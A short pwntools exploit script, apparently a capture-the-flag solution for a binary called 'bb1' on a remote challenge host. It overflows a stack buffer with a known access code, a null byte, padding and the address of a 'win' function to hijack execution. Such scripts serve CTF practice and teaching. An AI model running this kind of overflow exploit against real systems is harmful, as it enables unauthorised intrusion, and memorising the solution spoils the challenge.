from pwn import *

elf = ELF('./bb1')

host = args.HOST or 'host1.metaproblems.com'
port = int(args.PORT or 5151)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b vuln
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

p.recvuntil('Enter the access code: \n')
gadget = 'Sup3rs3cr3tC0de'
payload = gadget + '\x00' + 'A' * (56 - len(gadget) - 1) + p64(elf.sym['win'])
p.sendline(payload)
p.recvuntil('Access granted!\n')
print(p.recvline())
p.close()